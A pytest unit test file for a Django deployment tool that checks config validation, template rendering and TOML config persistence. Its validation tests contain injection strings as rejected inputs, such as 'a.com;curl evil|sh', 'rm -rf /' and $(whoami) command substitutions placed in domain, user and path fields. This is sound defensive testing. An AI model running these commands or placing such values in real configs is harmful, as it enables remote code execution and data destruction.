"""
Unit tests for the deployment tooling (DeploymentHandler + ConfigManager).

These focus on the highest-risk, security-sensitive behavior:
- validate_config() must reject shell metacharacters in any interpolated field
- render_template() substitutes config values into templates
- ConfigManager save/load round-trips persistent (non-secret) config
- ConfigManager.get_config() persists CLI overrides to disk

No real network / SSH is performed: no fabric Connection is ever constructed
against a real host, and no input() prompts are triggered.
"""

from unittest.mock import Mock

import pytest

from django_mosaic.management.commands._deployment import (
    SHELL_SAFE_PATTERNS,
    DeploymentHandler,
)
from django_mosaic.management.commands.config_manager import ConfigManager


def make_handler():
    """Build a DeploymentHandler with fake stdout/style.

    stdout is a Mock exposing .write(). style methods (SUCCESS/ERROR/WARNING)
    return their argument unchanged, matching how Django's style callables
    behave for the purposes of the code under test.
    """
    stdout = Mock()
    style = Mock()
    style.SUCCESS.side_effect = lambda msg: msg
    style.ERROR.side_effect = lambda msg: msg
    style.WARNING.side_effect = lambda msg: msg
    return DeploymentHandler(stdout=stdout, style=style)


def clean_config():
    """A fully valid config that must pass validate_config()."""
    return {
        "host": "1.2.3.4",
        "user": "root",
        "domain": "blog.example.com",
        "email": "admin@example.com",
        "app_name": "mosaic",
        "install_path": "/var/www/mosaic",
    }


# ---------------------------------------------------------------------------
# validate_config -- SECURITY (most important)
# ---------------------------------------------------------------------------


class TestValidateConfigSecurity:
    def test_clean_config_passes(self):
        handler = make_handler()
        # Should not raise.
        handler.validate_config(clean_config())

    def test_clean_config_returns_none(self):
        handler = make_handler()
        assert handler.validate_config(clean_config()) is None

    @pytest.mark.parametrize(
        "domain",
        [
            "a.com;curl evil|sh",
            "a.com$(whoami)",
            "a.com`id`",
            "a.com && rm -rf /",
            "a.com\nb.com",
        ],
    )
    def test_domain_with_shell_metacharacters_rejected(self, domain):
        handler = make_handler()
        config = clean_config()
        config["domain"] = domain
        with pytest.raises(ValueError):
            handler.validate_config(config)

    @pytest.mark.parametrize(
        "email",
        [
            "a;b@example.com",
            "a b@example.com",
            "user@exa mple.com",
            "user@example.com;id",
        ],
    )
    def test_email_with_shell_metacharacters_rejected(self, email):
        handler = make_handler()
        config = clean_config()
        config["email"] = email
        with pytest.raises(ValueError):
            handler.validate_config(config)

    @pytest.mark.parametrize(
        "user",
        [
            "ro ot",
            "; rm -rf",
            "root; id",
            "root$(id)",
        ],
    )
    def test_user_with_spaces_or_metacharacters_rejected(self, user):
        handler = make_handler()
        config = clean_config()
        config["user"] = user
        with pytest.raises(ValueError):
            handler.validate_config(config)

    @pytest.mark.parametrize(
        "app_name",
        [
            "mosaic/;",
            "mosaic;id",
            "mo saic",
            "mosaic$(id)",
        ],
    )
    def test_app_name_with_slash_or_metacharacters_rejected(self, app_name):
        handler = make_handler()
        config = clean_config()
        config["app_name"] = app_name
        with pytest.raises(ValueError):
            handler.validate_config(config)

    @pytest.mark.parametrize(
        "install_path",
        [
            "..",
            "/var/www/$()",
            "/var/www;rm -rf /",
            "relative/path",  # must be absolute (start with /)
            "/var/www/`id`",
        ],
    )
    def test_install_path_traversal_or_metacharacters_rejected(self, install_path):
        handler = make_handler()
        config = clean_config()
        config["install_path"] = install_path
        with pytest.raises(ValueError):
            handler.validate_config(config)

    def test_error_message_names_offending_field(self):
        handler = make_handler()
        config = clean_config()
        config["domain"] = "a.com;id"
        with pytest.raises(ValueError, match="domain"):
            handler.validate_config(config)

    def test_none_values_are_skipped(self):
        handler = make_handler()
        # Only supply a subset; missing fields are None and should be skipped.
        config = {"domain": "blog.example.com", "email": "admin@example.com"}
        handler.validate_config(config)  # should not raise

    def test_every_pattern_field_is_enforced(self):
        # Guard against a field silently dropping out of the safe-pattern set.
        handler = make_handler()
        for field in SHELL_SAFE_PATTERNS:
            config = clean_config()
            config[field] = "x`id`x"
            with pytest.raises(ValueError):
                handler.validate_config(config)


# ---------------------------------------------------------------------------
# render_template
# ---------------------------------------------------------------------------


def render_config():
    return {
        "app_name": "mosaic",
        "domain": "blog.example.com",
        "install_path": "/var/www/mosaic",
        "gunicorn_workers": 4,
        "wsgi_module": "website.wsgi:application",
        "url_conf": "website.urls",
        "secret_key": "s3cr3t-key-value",
        "email": "admin@example.com",
    }


class TestRenderTemplate:
    def test_all_placeholders_substituted(self):
        handler = make_handler()
        template = (
            "app={{APP_NAME}} domain={{DOMAIN}} path={{INSTALL_PATH}} "
            "workers={{GUNICORN_WORKERS}} wsgi={{WSGI_MODULE}} "
            "urls={{URL_CONF}} secret={{SECRET_KEY}} email={{EMAIL}}"
        )
        result = handler.render_template(template, render_config())

        assert "mosaic" in result
        assert "blog.example.com" in result
        assert "/var/www/mosaic" in result
        assert "website.wsgi:application" in result
        assert "website.urls" in result
        assert "s3cr3t-key-value" in result
        assert "admin@example.com" in result
        # No leftover placeholders for provided keys.
        assert "{{" not in result
        assert "}}" not in result

    def test_int_gunicorn_workers_stringified(self):
        handler = make_handler()
        result = handler.render_template("w={{GUNICORN_WORKERS}}", render_config())
        assert result == "w=4"

    def test_secret_key_value_is_injected(self):
        handler = make_handler()
        result = handler.render_template("SECRET_KEY={{SECRET_KEY}}", render_config())
        assert result == "SECRET_KEY=s3cr3t-key-value"

    def test_repeated_placeholder_replaced_everywhere(self):
        handler = make_handler()
        result = handler.render_template("{{DOMAIN}}/{{DOMAIN}}", render_config())
        assert result == "blog.example.com/blog.example.com"


# ---------------------------------------------------------------------------
# ConfigManager save/load round-trip
# ---------------------------------------------------------------------------


def full_persistable_config():
    return {
        "host": "1.2.3.4",
        "user": "root",
        "ssh_key": "~/.ssh/id_rsa",
        "install_path": "/var/www/mosaic",
        "app_name": "mosaic",
        "domain": "blog.example.com",
        "email": "admin@example.com",
        "gunicorn_workers": 2,
        "wsgi_module": "website.wsgi:application",
        "url_conf": "website.urls",
    }


class TestConfigManagerRoundTrip:
    def test_save_load_round_trip(self, tmp_path):
        config_file = tmp_path / ".deployment-config.toml"
        manager = ConfigManager(config_file=str(config_file))

        config = full_persistable_config()
        manager.save_to_file(config)

        assert config_file.exists()
        loaded = manager.load_from_file()

        for key, value in config.items():
            assert loaded[key] == value

    def test_secret_key_not_persisted(self, tmp_path):
        config_file = tmp_path / ".deployment-config.toml"
        manager = ConfigManager(config_file=str(config_file))

        config = full_persistable_config()
        config["secret_key"] = "should-not-be-saved"
        manager.save_to_file(config)

        loaded = manager.load_from_file()
        assert "secret_key" not in loaded
        assert "should-not-be-saved" not in config_file.read_text()

    def test_load_missing_file_returns_empty_dict(self, tmp_path):
        config_file = tmp_path / "does-not-exist.toml"
        manager = ConfigManager(config_file=str(config_file))
        assert manager.load_from_file() == {}

    def test_integer_value_preserved_as_int(self, tmp_path):
        config_file = tmp_path / ".deployment-config.toml"
        manager = ConfigManager(config_file=str(config_file))
        manager.save_to_file(full_persistable_config())
        loaded = manager.load_from_file()
        assert loaded["gunicorn_workers"] == 2
        assert isinstance(loaded["gunicorn_workers"], int)

    def test_none_values_dropped_on_save(self, tmp_path):
        config_file = tmp_path / ".deployment-config.toml"
        manager = ConfigManager(config_file=str(config_file))
        config = full_persistable_config()
        config["domain"] = None
        manager.save_to_file(config)
        loaded = manager.load_from_file()
        assert "domain" not in loaded


# ---------------------------------------------------------------------------
# ConfigManager.get_config persists CLI overrides (regression: og_config alias)
# ---------------------------------------------------------------------------


class TestGetConfigPersistsCliOverrides:
    def test_cli_override_written_to_file(self, tmp_path):
        config_file = tmp_path / ".deployment-config.toml"

        # Seed the file with an initial saved config.
        seed_manager = ConfigManager(config_file=str(config_file))
        seed_manager.save_to_file(full_persistable_config())

        # New manager loads that file, then a CLI override changes the host.
        manager = ConfigManager(config_file=str(config_file))
        # required_fields=[] so gather_interactively never calls input().
        result = manager.get_config(
            cli_args={"host": "new-host.example.com"},
            required_fields=[],
        )

        assert result["host"] == "new-host.example.com"

        # The override must be persisted to disk (the og_config aliasing bug
        # would have left the file with the old host).
        reloaded = ConfigManager(config_file=str(config_file)).load_from_file()
        assert reloaded["host"] == "new-host.example.com"

    def test_no_change_still_returns_saved_config(self, tmp_path):
        config_file = tmp_path / ".deployment-config.toml"
        seed_manager = ConfigManager(config_file=str(config_file))
        seed_manager.save_to_file(full_persistable_config())

        manager = ConfigManager(config_file=str(config_file))
        result = manager.get_config(cli_args=None, required_fields=[])

        assert result["host"] == "1.2.3.4"
        assert result["domain"] == "blog.example.com"

    def test_none_cli_args_do_not_override(self, tmp_path):
        config_file = tmp_path / ".deployment-config.toml"
        seed_manager = ConfigManager(config_file=str(config_file))
        seed_manager.save_to_file(full_persistable_config())

        manager = ConfigManager(config_file=str(config_file))
        # A None value in cli_args must not clobber the saved value.
        result = manager.get_config(
            cli_args={"host": None},
            required_fields=[],
        )
        assert result["host"] == "1.2.3.4"
